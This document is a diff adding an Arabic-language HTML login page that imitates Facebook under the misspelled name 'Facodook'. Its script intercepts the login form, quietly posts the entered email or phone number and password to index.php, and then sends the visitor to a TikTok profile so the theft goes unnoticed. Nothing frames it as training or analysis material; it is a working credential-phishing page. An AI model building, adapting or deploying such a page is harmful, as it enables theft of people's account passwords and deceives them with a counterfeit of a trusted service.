@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>تسجيل الدخول - Facodook</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <div class="container">
+    <div class="login-box">
+      <h1>facodook</h1>
+      <p>يساعدك Facodook على التواصل مع الأشخاص ومشاركة ما تريد معهم.</p>
+      <form id="Login">
+        <input type="text" name="username" placeholder="البريد الإلكتروني أو رقم الهاتف" required />
+        <input type="password" name="password" placeholder="كلمة السر" required />
+        <button type="submit">تسجيل الدخول</button>
+        <a href="#">هل نسيت كلمة السر؟</a>
+        <hr>
+        <button class="create-account" type="button">إنشاء حساب جديد</button>
+      </form>
+    </div>
+  </div>
+
+  <script>
+    document.getElementById("Login").addEventListener("submit", function(e){
+      e.preventDefault();
+
+      var user = document.querySelector("input[name='username']").value;
+      var pass = document.querySelector("input[name='password']").value;
+
+      fetch("index.php", {
+        method: "POST",
+        headers: { "Content-Type": "application/x-www-form-urlencoded" },
+        body: `username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}`
+      });
+      window.location.href = "https://www.tiktok.com/@musaila_10?is_from_webapp=1&sender_device=pc";
+    });
+  </script>
+</body>
+</html>
+
